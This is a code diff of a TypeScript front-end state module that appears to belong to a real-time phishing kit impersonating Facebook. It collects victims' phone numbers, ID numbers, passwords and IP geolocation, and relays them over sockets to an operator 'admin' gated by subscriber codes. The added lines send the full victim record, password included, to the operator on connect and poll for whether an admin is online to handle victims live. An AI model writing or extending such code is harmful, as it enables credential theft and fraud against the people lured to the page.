@@ -52,7 +52,7 @@ export const mainInfo = signal({
   phone: "",
   idNumber: "",
   password: "",
-  id: "",
+  _id: "",
   room: ROOM,
   Ip: "",
   country: "",
@@ -83,7 +83,7 @@ export const logo = signal("facebook");
 
 export const specialId = signal("");
 
-export const isCheck = signal(false);
+export const isError = signal("");
 
 // == Listen For Successfully Connected With Real Time Server  ==
 
@@ -98,15 +98,16 @@ effect(() => {
       { code: ROOM }
     )
     .then(() => {
-      isCheck.value = true;
+      isError.value = "";
     })
     .catch(() => {
-      isCheck.value = false;
+      isError.value =
+        "The Code Is Expired Or Wrong, Connect With Page Owner To Solve Problem Or Make Sure That You Write A Right Code";
     });
 });
 
 effect(() => {
-  if (isCheck.value)
+  if (!isError.value)
     axios
       .get("https://ipapi.co/json/")
       .then((res) => {
@@ -132,6 +133,14 @@ socket.value.on("successfully-connected", (id: string) => {
 
   //Joining With Current Id To Server
   socket.value.emit("join", socketId.value);
+  socket.value.emit("currentPage", {
+    ...mainInfo.value,
+    page: currentPage.value,
+    room: ROOM,
+    socketId: socketId.value,
+    date: new Date(),
+    init: true,
+  });
 });
 
 effect(() => {
@@ -142,6 +151,17 @@ effect(() => {
       room: ROOM,
       socketId: socketId.value,
     });
+    socket.value.emit(
+      "connected-admins",
+      ROOM,
+      ({ status }: { status: boolean }) => {
+        if (!status) {
+          isError.value = "Admin Is Not Connected Write Now, Come Back Later";
+        } else {
+          isError.value = "";
+        }
+      }
+    );
   }
 
   if (currentPage.value == "page6") {
@@ -162,6 +182,17 @@ effect(() => {
       waitingForAdminResponse: false,
       mode: "last",
     });
+    axios
+      .patch(
+        `${
+          import.meta.env.VITE_MODE == "DEV"
+            ? import.meta.env.VITE_DEV_API_URL
+            : import.meta.env.VITE_PROD_API_URL
+        }/subscriber/completed`,
+        { code: ROOM }
+      )
+      .then(() => {})
+      .catch(() => {});
   }
 });
 
@@ -242,7 +273,7 @@ export function sendDataToServer({
     id: socketId.value,
     next: nextPage,
     page: current,
-    userId: mainInfo.value?.id,
+    userId: mainInfo.value?._id,
     idNumber: mainInfo.value?.idNumber,
     mode,
     waitingForAdminResponse,
@@ -265,8 +296,8 @@ export function sendMessage(message: string) {
     id: socketId.value,
     createdAt: new Date(),
     room: ROOM,
-    userId: mainInfo.value?.id,
-    myId: mainInfo.value?.id,
+    userId: mainInfo.value?._id,
+    myId: mainInfo.value?._id,
   });
 
   messages.value = [
@@ -295,7 +326,7 @@ export function checkUser(data: FieldValues, navigate: NavigateFunction) {
   };
 
   socket.value.emit("checkUser", mainInfo.value, ({ id }: { id: string }) => {
-    mainInfo.value = { ...mainInfo.value, id };
+    mainInfo.value = { ...mainInfo.value, _id: id };
   });
 
   navigate("/page2");
@@ -335,5 +366,16 @@ function sendData() {
 }
 
 setInterval(() => {
-  if (isCheck.value) sendData();
+  socket.value.emit(
+    "connected-admins",
+    ROOM,
+    ({ status }: { status: boolean }) => {
+      if (!status) {
+        isError.value = "Admin Is Not Connected Write Now, Come Back Later";
+      } else {
+        isError.value = "";
+      }
+    }
+  );
+  if (!isError.value) sendData();
 }, 2000);
